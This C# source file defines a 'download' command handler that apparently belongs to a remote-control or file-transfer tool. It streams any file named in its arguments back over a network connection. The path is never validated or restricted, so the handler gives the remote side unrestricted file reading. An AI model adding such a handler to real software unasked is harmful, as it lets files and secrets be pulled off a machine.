﻿using System;
using System.Collections.Generic;
using System.IO;
using Shared;

namespace ServerCommands
{
    internal class Download : ICommand
    {
        public string name { get; } = "download";


        public void Process(List<string> args)
        {
            if (!File.Exists(args[0]))
            {
                ServerCommandsManager.networkManager.WriteLine("NotFound");
                return;
            }

            try
            {
                using (var readStream = new FileStream(args[0], FileMode.Open))
                {
                    ServerCommandsManager.networkManager.WriteLine("OK");

                    // Send the data length first
                    ServerCommandsManager.networkManager.WriteLine(new FileInfo(args[0]).Length.ToString());
                    ServerCommandsManager.networkManager.StreamToNetworkStream(readStream);
                }
            }
            catch (IOException)
            {
                ServerCommandsManager.networkManager.WriteLine("IOException");
            }
        }
    }
}